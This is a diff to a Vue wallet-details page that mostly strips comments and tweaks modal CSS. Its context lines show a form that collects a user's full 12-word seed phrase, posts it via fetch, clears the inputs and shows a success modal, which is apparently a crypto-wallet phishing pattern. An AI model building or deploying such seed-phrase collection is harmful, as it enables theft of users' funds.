@@ -2,11 +2,9 @@
   <div class="wallet-details">
     <header>
       <router-link to="/" class="logo">
-        <!-- <img src="" alt="blockchain-logo" /> -->
       </router-link>
       <div class="nav">
         <router-link :to="{ name: 'Wallets' }">Wallets</router-link>
-        <!-- <div class="flag"></div> -->
       </div>
     </header>
     <section class="details">
@@ -139,16 +137,12 @@ const handleSubmit = async (e) => {
       body: JSON.stringify(payload),
     });
 
-    // Wait for 1 second before clearing the input and showing the modal
     setTimeout(() => {
-      // Clear inputs
       formState.ai = '';
       formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Clear the phrase input
 
-      // Use nextTick to ensure the DOM is updated before showing the modal
       nextTick(() => {
         showSuccessModal.value = true; // Show the modal
-        // console.log('Modal should now be shown');
       });
     }, 1000); // 1000ms = 1 second
 
@@ -168,10 +162,6 @@ const { seedPhrase } = formState
 
 
 
-<!-- // Clear inputs immediately after submission
-  formState.ai = '';
-  formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Ensure reactivity -->
-
 
 <style scoped>
 /* Center the modal */
@@ -184,11 +174,12 @@ const { seedPhrase } = formState
   color: white;
   padding: 20px;
   border-radius: 8px;
-  box-shadow: rgba(50, 50, 93, 0.25) 0px 50px 100px -20px, rgba(0, 0, 0, 0.3) 0px 30px 60px -30px, rgba(10, 37, 64, 0.35) 0px -2px 6px 0px inset;
+  box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
   z-index: 1000;
   width: 80%;
   max-width: 400px;
   text-align: center;
+  background-color: rgb(255, 255, 255);
 }
 
 /* Dim the background when modal is open */
@@ -223,7 +214,7 @@ const { seedPhrase } = formState
 }
 
 .modal-content button:hover {
-  background: #0056b3;
+  background: #6e9bca;
 }
 /* Show modal when active */
 .modal.show {
